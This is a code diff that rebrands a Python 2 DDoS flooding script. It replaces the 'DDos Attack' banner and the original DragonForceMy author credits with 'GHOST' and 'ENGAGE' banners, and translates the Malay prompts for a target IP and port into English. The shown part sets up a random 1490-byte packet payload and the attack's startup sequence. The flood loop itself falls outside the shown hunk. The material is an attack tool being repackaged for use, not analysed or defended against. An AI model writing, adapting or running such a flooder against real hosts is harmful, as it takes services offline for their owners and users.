@@ -18,21 +18,17 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDos Attack")
+os.system("figlet GHOST")
 
 print
-print "Author   : DragonForceMy"
-print "Forum    : https://dragonforce.io"
-print "github   : https://github.com/waitercinta"
-print "Facebook : https://www.facebook.com/dragonforce.io"
-print "----------*Hak milik Rakyat Malaysia*---------------"
+print "----------*GHOST56*---------------"
 print
 
-ip = raw_input("Masukkan IP Target : ")
-port = input  ("Masukkan Port      : ")
+ip = raw_input("TARGET IP: ")
+port = input  ("PORT     : ")
 
 os.system("clear")
-os.system("figlet Attack Starting")
+os.system("figlet ENGAGE")
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
